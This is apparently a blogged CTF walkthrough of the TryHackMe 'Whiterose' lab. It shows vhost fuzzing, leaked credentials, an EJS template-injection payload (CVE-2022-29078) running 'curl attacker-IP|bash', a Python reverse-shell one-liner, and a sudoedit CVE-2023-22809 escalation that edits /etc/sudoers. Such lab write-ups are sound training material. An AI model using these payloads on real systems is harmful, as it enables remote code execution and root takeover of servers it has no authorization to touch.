---
title: "Whiterose - TryHackMe"
date: 2025-01-02 00:00:00 +0000
categories: [TryHackMe]
tags: [web, vhost, node, js, ejs, ssti, sudoedit]
render_with_liquid: false
image: /images/tryhackme_whiterose/room_image.webp
---

Whiterose - TryHackMe

Whiterose began by identifying a virtual host and logging in using the credentials provided in the room. Once inside, we accessed a chat feature. By altering a parameter to retrieve older messages, we uncovered credentials for an admin account. After switching to the admin user, we reached a settings page that was susceptible to Server-Side Template Injection (SSTI) because user input was directly passed to the `render` function for `ejs`. By exploiting this vulnerability, we achieved shell access. Subsequently, we leveraged a `sudoedit` vulnerability to escalate privileges and gain `root` access.

[![Tryhackme Room Link](/images/tryhackme_whiterose/room_card.webp){: width="300" height="300" .shadow}](https://tryhackme.com/r/room/whiterose){: .center }

## Initial Enumeration

### Nmap Scan

```console
$ nmap -T4 -n -sC -sV -Pn -p- 10.10.116.77
Nmap scan report for 10.10.116.77
Host is up (0.10s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 b9:07:96:0d:c4:b6:0c:d6:22:1a:e4:6c:8e:ac:6f:7d (RSA)
|   256 ba:ff:92:3e:0f:03:7e:da:30:ca:e3:52:8d:47:d9:6c (ECDSA)
|_  256 5d:e4:14:39:ca:06:17:47:93:53:86:de:2b:77:09:7d (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: nginx/1.14.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

There are two ports open.

- **22** (`SSH`)  
- **80** (`HTTP`)

### Web 80

Visiting `http://10.10.116.77/` redirects us to `http://cyprusbank.thm/`, so let's add it to our hosts file:

```plaintext
10.10.116.77 cyprusbank.thm
```
{: file="/etc/hosts" }

Afterward, visiting `http://cyprusbank.thm/` displays only a maintenance message.

![Web 80 Index](/images/tryhackme_whiterose/web_80_index.webp){: width="1200" height="600" }

### Vhost Enumeration

Since no noteworthy findings or extra files were uncovered during directory fuzzing, it’s time to explore **virtual hosts (vhosts)**.

```console
$ ffuf -u 'http://cyprusbank.thm/' -H "Host: FUZZ.cyprusbank.thm" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -mc all -t 100 -ic -fw 1
...
www                     [Status: 200, Size: 252, Words: 19, Lines: 9, Duration: 110ms]
admin                   [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 444ms]
```
{: .wrap }

We find two: `admin` and `www`. Let's add them to our hosts file:

```plaintext
10.10.116.77 cyprusbank.thm www.cyprusbank.thm admin.cyprusbank.thm
```
{: file="/etc/hosts" }

Visiting `http://www.cyprusbank.thm/`, we find it appears identical to `http://cyprusbank.thm/`.

![Web 80 Www Index](/images/tryhackme_whiterose/web_80_www_index.webp){: width="1200" height="600" }

Visiting `http://admin.cyprusbank.thm/`, we are redirected to `http://admin.cyprusbank.thm/login`, where a login page is displayed.

![Web 80 Admin Index](/images/tryhackme_whiterose/web_80_admin_index.webp){: width="1200" height="600" }

## Shell as Web

### Access as Gayle Bev

The options in the top bar are inaccessible at this stage. However, the credentials `Olivia Cortez:olivi8` provided in the room allow us to log in.  

Upon successful login, we are presented with a page showing transactions and accounts, though we are unable to access customers' phone numbers.  

![Web 80 Admin Index Two](/images/tryhackme_whiterose/web_80_admin_index2.webp){: width="1200" height="600" }

While logged in, we also gain access to other pages in the top bar.

Visiting `http://admin.cyprusbank.thm/search` allows us to search for customers by name.

![Web 80 Admin Search](/images/tryhackme_whiterose/web_80_admin_search.webp){: width="1200" height="600" }

Checking `http://admin.cyprusbank.thm/settings`, we see that we are not authorized to access this page.

![Web 80 Admin Settings](/images/tryhackme_whiterose/web_80_admin_settings.webp){: width="1200" height="600" }

Finally, checking `Messages` redirects us to `http://admin.cyprusbank.thm/messages/?c=5`, where we can view a chat.

![Web 80 Admin Messages](/images/tryhackme_whiterose/web_80_admin_messages.webp){: width="1200" height="600" }

Although the chat contains no significant messages, the c parameter in the URL stands out as noteworthy.

When a new message is sent in the chat, the oldest one is removed, keeping the display limited to five messages at a time.

![Web 80 Admin Messages Two](/images/tryhackme_whiterose/web_80_admin_messages2.webp){: width="1200" height="600" }

The `c` parameter likely controls the number of messages shown.

To test this, we modified the URL to `http://admin.cyprusbank.thm/messages/?c=10` and confirmed our assumption. By doing so, we were able to view older messages, one of which revealed the password for the `Gayle Bev` user.

![Web 80 Admin Messages Three](/images/tryhackme_whiterose/web_80_admin_messages3.webp){: width="1200" height="600" }

### EJS SSTI

Once we logged out from the `Olivia Cortez` account and logged in as `Gayle Bev` using the discovered password, we gained access to the phone numbers of the clients.

![Web 80 Admin Index Three](/images/tryhackme_whiterose/web_80_admin_index3.webp){: width="1200" height="600" }

We also gain access to the **Settings** page at `http://admin.cyprusbank.thm/settings`.

![Web 80 Admin Settings Two](/images/tryhackme_whiterose/web_80_admin_settings2.webp){: width="1200" height="600" }

When testing the form, we observed that it allows us to modify customer passwords and displays the newly set password.

![Web 80 Admin Settings Three](/images/tryhackme_whiterose/web_80_admin_settings3.webp){: width="1200" height="600" }

After testing the `name` and `password` parameters for vulnerabilities such as **SQL** or **SSTI**, we found no issues. Therefore, we decided to fuzz for additional parameters that the `/settings` endpoint might accept.  

Using **ffuf** for this task, we uncover a few interesting parameters:

```console
$ ffuf -u 'http://admin.cyprusbank.thm/settings' -X POST -H 'Content-Type: application/x-www-form-urlencoded' -H 'Cookie: connect.sid=s%3AMwjzKA3EcBUXIsqGNDDaHARGh5B7JYwk.jwhk7KbGBNbC46HXtU8Ln%2BqMzdigbh1ZTMDnal6RC24' -mc all -d 'name=test&password=test&FUZZ=test' -w /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt -t 100 -fs 2098
...
include                 [Status: 500, Size: 1388, Words: 80, Lines: 11, Duration: 123ms]
password                [Status: 200, Size: 2103, Words: 427, Lines: 59, Duration: 473ms]
error                   [Status: 200, Size: 1467, Words: 281, Lines: 49, Duration: 119ms]
message                 [Status: 200, Size: 2159, Words: 444, Lines: 61, Duration: 151ms]
client                  [Status: 500, Size: 1399, Words: 80, Lines: 11, Duration: 157ms]
async                   [Status: 200, Size: 2, Words: 1, Lines: 1, Duration: 159ms]
```
{: .wrap }

While the `error` and `message` parameters merely cause the server to echo their values in the response, the `include`, `client`, and `async` parameters are more noteworthy.  

When both the `include` and `client` parameters are included, the server responds with a **500** error, displaying a message like this:

![Web 80 Admin Settings Four](/images/tryhackme_whiterose/web_80_admin_settings4.webp){: width="1000" height="500" }

```console
TypeError: /home/web/app/views/settings.ejs:4
    2| <html lang="en">
    3|   <head>
 >> 4|     <%- include("../components/head"); %>
    5|     <title>Cyprus National Bank</title>
    6|   </head>
    7|   <body>

include is not a function
    at eval ("/home/web/app/views/settings.ejs":12:17)
    at settings (/home/web/app/node_modules/ejs/lib/ejs.js:692:17)
    at tryHandleCache (/home/web/app/node_modules/ejs/lib/ejs.js:272:36)
    at View.exports.renderFile [as engine] (/home/web/app/node_modules/ejs/lib/ejs.js:489:10)
    at View.render (/home/web/app/node_modules/express/lib/view.js:135:8)
    at tryRender (/home/web/app/node_modules/express/lib/application.js:657:10)
    at Function.render (/home/web/app/node_modules/express/lib/application.js:609:3)
    at ServerResponse.render (/home/web/app/node_modules/express/lib/response.js:1039:7)
    at /home/web/app/routes/settings.js:27:7
    at runMicrotasks (<anonymous>)
```

When we use the `async` parameter, the server simply returns an empty response with `{}`.

![Web 80 Admin Settings Five](/images/tryhackme_whiterose/web_80_admin_settings5.webp){: width="1000" height="500" }

From the error message, we deduce that the application uses **EJS** as its template engine. If the application passes our request body directly to the `render` function as the `data` argument, it could potentially be vulnerable to **SSTI**. This is because **EJS** permits options like `client` and `async` to be included alongside data. The fact that the `client` option triggers an error, while using the `async` option results in an empty `{}` response, strongly suggests the presence of an **SSTI** vulnerability.

To confirm this, we decide to experiment with the `delimiter` option, which is another configurable option that can be passed with data. By default, it is set to `%`, but if we change it to a string not present in the template, we should be able to leak the template content.

Upon testing this theory, we successfully leak the template, confirming our suspicion.

![Web 80 Admin Settings Six](/images/tryhackme_whiterose/web_80_admin_settings6.webp){: width="1000" height="500" }

As mentioned earlier, only a limited number of options are allowed to be passed with data. However, this is where the `CVE-2022-29078` vulnerability becomes relevant. By exploiting the `settings['view options']` parameter, we are able to pass any option without restriction.  

Certain options, like `outputFunctionName`, are utilized by **EJS** without any input sanitization to build the template body, allowing us to inject code.

For more details on the vulnerability and a **PoC** (Proof of Concept), you can refer to this article [here](https://eslam.io/posts/ejs-server-side-template-injection-rce/).

By testing the **PoC** payload from the article, we confirm its effectiveness, as we receive a request on our server.

```
settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('curl 10.11.72.22');s
```
{: .wrap }

![Web 80 Admin Settings Seven](/images/tryhackme_whiterose/web_80_admin_settings7.webp){: width="1000" height="500" }

```console
10.10.116.77 - - [31/Oct/2024 05:03:44] "GET / HTTP/1.1" 200 -
10.10.116.77 - - [31/Oct/2024 05:03:44] "GET / HTTP/1.1" 200 -
10.10.116.77 - - [31/Oct/2024 05:03:45] "GET / HTTP/1.1" 200 -
```
At this point, we can use the vulnerability to obtain a shell. First, we set up our web server to serve a reverse shell payload. This allows us to execute the payload remotely and gain access to the system.

```console
$ cat index.html
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.11.72.22",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'                                     

$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```
{: .wrap }

Once the web server is serving the reverse shell payload, we can modify our injected payload to make the server download and execute the reverse shell. This step allows the server to initiate a connection back to our attacking machine, granting us access to the system.

```console
settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('curl 10.11.72.22|bash');s
```
{: .wrap }

After sending our payload, the server becomes unresponsive, and we successfully receive a shell as the `web` user. This confirms that the reverse shell has been executed, giving us control over the server.

![Web 80 Admin Settings Eight](/images/tryhackme_whiterose/web_80_admin_settings8.webp){: width="1000" height="500" }

```console
$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.11.72.22] from (UNKNOWN) [10.10.116.77] 49286
$ python3 -c 'import pty;pty.spawn("/bin/bash");'
python3 -c 'import pty;pty.spawn("/bin/bash");'
web@cyprusbank:~/app$ export TERM=xterm
export TERM=xterm
web@cyprusbank:~/app$ ^Z
zsh: suspended  nc -lvnp 443

$ stty raw -echo; fg
[1]  + continued  nc -lvnp 443

web@cyprusbank:~/app$ 
```

Once the shell is stabilized, we navigate to `/home/web/user.txt` and read the user flag, confirming our successful access to the system as the `web` user.

```console
web@cyprusbank:~/app$ wc -c /home/web/user.txt
35 /home/web/user.txt
```

## Shell as root

### CVE-2023-22809

Upon checking the `sudo` privileges for the `web` user, we discover that the user is allowed to run `sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm` as the `root` user. This provides an opportunity to escalate our privileges to `root`.

```console
web@cyprusbank:~/app$ sudo -l
Matching Defaults entries for web on cyprusbank:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH",
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, mail_badpass

User web may run the following commands on cyprusbank:
    (root) NOPASSWD: sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
```

Upon checking the version of `sudo`, we find it is `1.9.12p1`. This version may have vulnerabilities that we can exploit to escalate privileges.

```console
web@cyprusbank:~/app$ sudoedit --version
Sudo version 1.9.12p1
Sudoers policy plugin version 1.9.12p1
Sudoers file grammar version 48
Sudoers I/O plugin version 1.9.12p1
Sudoers audit plugin version 1.9.12p1
```
While searching for vulnerabilities in `sudoedit` version `1.9.12p1`, we identify the `CVE-2023-22809` vulnerability. For more details, you can refer to [this security advisory from Synacktiv](https://www.synacktiv.com/sites/default/files/2023-01/sudo-CVE-2023-22809.pdf).

In essence, `sudoedit` allows users to specify their preferred editor using environment variables like `SUDO_EDITOR`, `VISUAL`, or `EDITOR`. These variables can include not only the editor itself but also additional arguments. When parsing them, `sudo` uses the `--` argument to separate the editor and its arguments from the file to be edited.

This opens up an opportunity: by using the `--` argument within the editor environment variables, we can trick `sudoedit` into opening files other than the intended ones. Since we can run `sudoedit` as `root`, this enables us to edit any file with root privileges.

To escalate our privileges, we have several files to choose from. In this case, we can modify the `/etc/sudoers` file to grant ourselves full `sudo` access.

Here’s how we can exploit the vulnerability:

```console
web@cyprusbank:~/app$ export EDITOR="nano -- /etc/sudoers"
web@cyprusbank:~/app$ sudo sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
```
As observed, we successfully opened the `/etc/sudoers` file using `nano`.

![Nano Sudoers File](/images/tryhackme_whiterose/nano_sudoers_file.webp){: width="1000" height="500" }

By adding `web ALL=(ALL) NOPASSWD: ALL` to the `/etc/sudoers` file, we grant our current user full `sudo` privileges without requiring a password.

![Nano Sudoers File Two](/images/tryhackme_whiterose/nano_sudoers_file2.webp){: width="1000" height="500" }

After saving the file and closing both the editor and the terminal, we can confirm that the changes to our `sudo` privileges have been applied successfully.

```console
web@cyprusbank:~/app$ sudo -l
Matching Defaults entries for web on cyprusbank:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH",
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, mail_badpass

User web may run the following commands on cyprusbank:
    (root) NOPASSWD: sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
    (ALL) NOPASSWD: ALL
```

Finally, by executing `sudo su -`, we gain a shell as the `root` user, allowing us to access and read the root flag located at `/root/root.txt`.

```console
web@cyprusbank:~/app$ sudo su -
root@cyprusbank:~# id
uid=0(root) gid=0(root) groups=0(root)
root@cyprusbank:~# wc -c /root/root.txt
21 /root/root.txt
```
With the root flag in hand, we've successfully exploited the vulnerabilities and escalated our privileges, securing total control of the system. Another challenge completed, and another victory in the world of cybersecurity. On to the next!

<style>
.center img {        
  display:block;
  margin-left:auto;
  margin-right:auto;
}
.wrap pre{
    white-space: pre-wrap;
}

</style>